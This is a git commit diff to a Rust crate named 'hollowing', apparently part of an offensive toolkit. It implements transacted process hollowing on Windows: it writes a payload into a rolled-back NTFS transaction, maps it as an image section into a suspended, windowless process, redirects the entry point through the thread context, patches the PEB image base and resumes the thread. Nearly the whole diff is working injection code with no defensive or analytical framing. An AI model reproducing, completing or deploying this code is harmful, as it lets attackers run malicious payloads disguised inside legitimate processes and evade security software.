fb1b8796cc0b103c6b23899331c07d64d9e372a1
sqlerrorthing <148702857+sqlerrorthing@users.noreply.github.com>
2025-06-08 23:21:50 +0800

    sync

--- hollowing/src/lib.rs
+++ hollowing/src/lib.rs
@@ -1,5 +1,6 @@
 #![feature(ptr_as_ref_unchecked)]
 #![no_std]
+#![allow(clippy::not_unsafe_ptr_arg_deref)]
 
 extern crate alloc;
 
@@ -8,22 +9,21 @@ use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::mem::zeroed;
 use core::ops::Deref;
-use core::ptr::{copy_nonoverlapping, null_mut};
-use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
+use core::ptr::{copy_nonoverlapping, null, null_mut};
 use utils::path::Path;
-use utils::WideString;
-use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
+use utils::{log_debug, WideString};
 use windows_sys::core::{PCWSTR, PWSTR};
-use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
-use windows_sys::Win32::System::Diagnostics::Debug::{SetThreadContext, WriteProcessMemory, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64};
-use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
+use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_ALL_AMD64, CONTEXT_ALL_X86, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, OBJECT_ATTRIB_FLAGS};
+use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
 use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
-use windows_sys::Win32::System::Threading::{ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
+use windows_sys::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DEBUG_PROCESS, DETACHED_PROCESS, PROCESS_INFORMATION, STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME};
 
-type PVoid = *const c_void;
-type PByte = *const u8;
+
+type PVoid = *mut c_void;
+type PByte = *mut u8;
 
 macro_rules! module_function {
     (
@@ -56,30 +56,8 @@ macro_rules! module_function {
     };
 }
 
-macro_rules! thread_context {
-    ($thread:expr) => {{
-        use windows_sys::Win32::{
-            Foundation::FALSE,
-            System::Diagnostics::Debug::{GetThreadContext, CONTEXT, WOW64_CONTEXT_INTEGER}
-        };
-
-        let mut context = CONTEXT {
-            ContextFlags: WOW64_CONTEXT_INTEGER,
-            ..unsafe { zeroed() }
-        };
-
-        if unsafe {
-            GetThreadContext($thread, &mut context)
-        } == FALSE {
-            None
-        } else {
-            Some(context)
-        }
-    }};
-}
-
 module_function!(
-    "kernel32.dll",
+    "kernel32",
     CreateProcessInternalW,
     fn(
         h_token: HANDLE,
@@ -89,12 +67,43 @@ module_function!(
         thread_attributes: *mut SECURITY_ATTRIBUTES,
         inherit_handles: BOOL,
         creation_flags: u32,
-        environment: HANDLE,
+        environment: PVoid,
         current_directory: PCWSTR,
         startup_info: *mut STARTUPINFOW,
         process_information: *mut PROCESS_INFORMATION,
         p_handle: *mut HANDLE
     ) -> BOOL
+);
+
+module_function!(
+    "ntdll",
+    NtCreateSection,
+    fn(
+        section_handle: *mut HANDLE,
+        desired_access: SECTION_FLAGS,
+        object_attributes: *mut c_void,
+        maximum_size: *mut i64,
+        section_page_protection: u32,
+        allocation_attributes: u32,
+        file_handle: HANDLE
+    ) -> NTSTATUS
+);
+
+module_function!(
+    "ntdll",
+    NtMapViewOfSection,
+    fn(
+        section_handle: HANDLE,
+        process_handle: HANDLE,
+        base_address: *mut PVoid,
+        zero_bits: usize,
+        commit_size: usize,
+        section_offset: *mut i64,
+        view_size: *mut usize,
+        inherit_disposition: u32,
+        allocation_type: u32,
+        win32_protect: u32
+    ) -> NTSTATUS
 );
 
 macro_rules! check {
@@ -105,7 +114,7 @@ macro_rules! check {
     };
 }
 
-pub fn make_transacted_section<S>(dummy_name: S, payload: &[u8]) -> Result<HANDLE, i32>
+pub fn make_transacted_section<S>(dummy_name: S, payload: PByte, payload_size: usize) -> Result<HANDLE, i32>
 where
     S: AsRef<str>
 {
@@ -151,8 +160,8 @@ where
     if unsafe {
         WriteFile(
             transacted_file,
-            payload.as_ptr() as _,
-            payload.len() as _,
+            payload,
+            payload_size as _,
             &mut written_len,
             null_mut()
         )
@@ -160,16 +169,16 @@ where
         return Err(INVALID_HANDLE_VALUE as _);
     }
 
-    let mut section: winapi::shared::ntdef::HANDLE = null_mut();
+    let mut section: HANDLE = null_mut();
     if unsafe {
         NtCreateSection(
-            &mut section as *mut winapi::shared::ntdef::HANDLE,
+            &mut section as *mut _ as _,
             SECTION_ALL_ACCESS,
             null_mut(),
             null_mut(),
             PAGE_READONLY,
             SEC_IMAGE,
-            transacted_file as _
+            transacted_file
         )
     } != STATUS_SUCCESS {
         return Err(INVALID_HANDLE_VALUE as _);
@@ -189,7 +198,7 @@ where
         CloseHandle(transaction)
     };
 
-    Ok(section as _)
+    Ok(section)
 }
 
 pub fn create_new_process_internal<C, S>(cmd_line: C, start_dir: S) -> Option<PROCESS_INFORMATION>
@@ -197,13 +206,11 @@ where
     C: AsRef<str>,
     S: AsRef<str>
 {
-    let cmd_line = cmd_line.as_ref().to_wide();
-    let start_dir = start_dir.as_ref().to_wide();
+    let mut cmd_line = cmd_line.as_ref().to_wide();
+    let mut start_dir = start_dir.as_ref().to_wide();
 
-    let mut si = STARTUPINFOW {
-        cb: size_of::<STARTUPINFOW>() as _,
-        ..unsafe { zeroed() }
-    };
+    let mut si: STARTUPINFOW = unsafe { zeroed() };
+    si.cb = size_of::<STARTUPINFOW>() as u32;
 
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
@@ -213,38 +220,40 @@ where
         CreateProcessInternalW(
             token,
             null_mut(),
-            cmd_line.as_ptr() as _,
+            cmd_line.as_mut_ptr(),
             null_mut(),
             null_mut(),
             FALSE,
             CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
             null_mut(),
-            start_dir.as_ptr() as _,
-            &mut si,
-            &mut pi,
-            &mut new_token,
+            start_dir.as_mut_ptr(),
+            &mut si as *mut _ as _,
+            &mut pi as *mut _ as _,
+            &mut new_token as *mut _ as _,
         )
     } == FALSE {
+        let err = unsafe { GetLastError() };
+        log_debug!("Failed to create process. Error code: {}\n", err);
         return None;
     }
 
     Some(pi)
 }
 
-pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<PVoid> {
-    let view_size = 0usize;
-    let section_base_address: *mut c_void = null_mut();
+pub fn map_buffer_into_process(pi: &PROCESS_INFORMATION, section: HANDLE) -> Option<PVoid> {
+    let mut view_size = 0usize;
+    let mut section_base_address: PVoid = null_mut();
 
     let status = unsafe {
         NtMapViewOfSection(
-            section as *mut _ as _,
-            process as *mut _ as _,
-            section_base_address as _,
+            section,
+            pi.hProcess,
+            &mut section_base_address,
             0,
             0,
             null_mut(),
-            view_size as _,
-            ViewShare,
+            &mut view_size,
+            1, // ViewShare
             0,
             PAGE_READONLY
         )
@@ -257,7 +266,7 @@ pub fn map_buffer_into_process(process: HANDLE, section: HANDLE) -> Option<PVoid
     }
 }
 
-pub fn get_payload_buffer<S>(filename: S) -> Option<Vec<u8>>
+pub fn get_payload_buffer<S>(filename: S) -> Option<(PByte, usize)>
 where
     S: AsRef<str>
 {
@@ -297,7 +306,7 @@ where
         MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
     };
 
-    let dll_raw_data = dll_data.Value as *mut u8;
+    let dll_raw_data = dll_data.Value as PByte;
 
     if dll_raw_data.is_null() {
         unsafe {
@@ -308,44 +317,74 @@ where
         return None;
     }
 
-    let payload_size = unsafe {
-        GetFileSize(file, null_mut())
-    } as usize;
+    let payload_size = unsafe { GetFileSize(file, null_mut()) } as usize;
 
-    let mut buffer = vec![0u8; payload_size];
-    unsafe { buffer.set_len(payload_size) };
+    let local_copy_address = unsafe {
+        VirtualAlloc(
+            null(),
+            payload_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        )
+    } as PByte;
+
+    if local_copy_address.is_null() {
+        return None;
+    }
 
     unsafe {
         copy_nonoverlapping(
             dll_raw_data,
-            buffer.as_mut_ptr(),
+            local_copy_address,
             payload_size
         );
     }
-
+    
     unsafe {
         UnmapViewOfFile(dll_data);
         CloseHandle(mapping);
         CloseHandle(file);
     }
 
-    Some(buffer)
+    Some((local_copy_address, payload_size))
 }
 
-fn update_remove_ep(thread: HANDLE, ep_va: u64) -> bool {
-    let Some(mut context) = thread_context!(thread) else {
+fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
+    const CONTEXT_FLAGS: u32 = if cfg!(target_arch = "x86_64") {
+        CONTEXT_INTEGER_AMD64
+    } else {
+        CONTEXT_INTEGER_X86
+    };
+
+    let mut context: CONTEXT = unsafe { zeroed() };
+    context.ContextFlags = CONTEXT_FLAGS;
+    
+    unsafe {
+        log_debug!("{}\n", SuspendThread(pi.hThread))
+    }
+    
+    if unsafe { GetThreadContext(pi.hThread, &mut context as *mut _ as _) == FALSE } {
+        log_debug!("Last os error: {}\n", unsafe { GetLastError() });
+        None
+    } else {
+        Some(context)
+    }
+}
+
+fn update_remove_ep(pi: &PROCESS_INFORMATION, ep_va: u64) -> bool {
+    let Some(mut context) = thread_context(pi) else {
         return false
     };
 
     context.Rcx = ep_va;
 
     unsafe {
-        SetThreadContext(thread, &context) == TRUE
+        SetThreadContext(pi.hThread, &context) == TRUE
     }
 }
 
-fn get_remote_peb_address(thread: HANDLE) -> Option<u64> {
-    thread_context!(thread).map(|context| context.Rdx)
+fn get_remote_peb_address(pi: &PROCESS_INFORMATION) -> Option<u64> {
+    thread_context(pi).map(|context| context.Rdx)
 }
 
 fn get_ep_rva(pe_buffer: PByte) -> u32 {
@@ -353,15 +392,16 @@ fn get_ep_rva(pe_buffer: PByte) -> u32 {
 
     macro_rules! address_of_entry_point {
         ($ptr:expr, $image:ty) => {{
-            (*($ptr as *mut $image)).OptionalHeader.AddressOfEntryPoint
+            let header = $ptr as *mut $image;
+            (*header).OptionalHeader.AddressOfEntryPoint
         }};
     }
 
     unsafe {
         let e_lfanew = (*payload_dos_hdr).e_lfanew as usize;
-        let ptr = pe_buffer.add(e_lfanew);
+        let ptr = (pe_buffer as usize).wrapping_add(e_lfanew) as PByte;
 
-        if cfg!(target_arch= "x86_64") {
+        if cfg!(target_arch = "x86_64") {
             address_of_entry_point!(ptr, IMAGE_NT_HEADERS64)
         } else {
             address_of_entry_point!(ptr, IMAGE_NT_HEADERS32)
@@ -369,15 +409,15 @@ fn get_ep_rva(pe_buffer: PByte) -> u32 {
     }
 }
 
-fn redirect_ep(thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
+fn redirect_ep(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
     let ep = get_ep_rva(loaded_pe);
-    let ep_va = (loaded_base as usize).wrapping_add(ep as usize) as u64;
+    let ep_va = (loaded_base as u64 as usize).wrapping_add(ep as usize) as u64;
 
-    update_remove_ep(thread, ep_va)
+    update_remove_ep(pi, ep_va)
 }
 
-fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_base: PVoid) -> bool {
-    let Some(remote_peb_address) = get_remote_peb_address(thread) else {
+fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
+    let Some(remote_peb_address) = get_remote_peb_address(pi) else {
         return false
     };
 
@@ -388,41 +428,44 @@ fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_base: PVoid) -> bo
     let mut written = 0;
     unsafe {
         WriteProcessMemory(
-            process,
+            pi.hProcess,
             remote_img_base,
-            loaded_base,
+            &loaded_base as *const _ as PVoid,
             img_base_size,
             &mut written
         ) == TRUE
     }
 }
 
-fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, process: HANDLE, thread: HANDLE) -> bool {
-    redirect_ep(thread, loaded_pe, loaded_base)
-        && set_new_image_base(process, thread, loaded_base)
+fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
+    if !redirect_ep(loaded_pe, loaded_base, pi) {
+        return false
+    }
+    
+    if !set_new_image_base(loaded_base, pi) {
+        return false
+    }
+    
+    true
 }
 
-pub fn hollow(target: &Path, payload: &[u8]) -> bool {
-    fn try_hollow(target: &Path, payload: &[u8]) -> Option<()> {
-        let tmp = Path::temp_file("tmp");
+pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROCESS_INFORMATION> {
+    let tmp = Path::temp_file("tmp");
+    let _ = tmp.create_file();
+    
+    let section = make_transacted_section(tmp.deref(), payload, payload_size).ok()?;
+    
+    let pi = create_new_process_internal(target.deref(), target.parent()?.deref())?;
 
-        let section = make_transacted_section(tmp.deref(), payload).ok()?;
-        let pi = create_new_process_internal(target.deref(), target.parent()?.deref())?;
+    let remote_base = map_buffer_into_process(&pi, section)?;
 
-        let (process, thread) = (pi.hProcess, pi.hThread);
+    if !redirect_to_payload(payload, remote_base, &pi) {
+        None
+    } else {
+        unsafe {
+            log_debug!("r1: {}, r2: {}, r3: {}\n", ResumeThread(pi.hThread), ResumeThread(pi.hThread), ResumeThread(pi.hThread));
+        };
 
-        let remote_base = map_buffer_into_process(process, section)?;
-
-        if !redirect_to_payload(payload.as_ptr(), remote_base, process, thread) {
-            None
-        } else {
-            unsafe {
-                ResumeThread(thread)
-            };
-
-            Some(())
-        }
+        Some(pi)
     }
-
-    try_hollow(target, payload).is_some()
 }
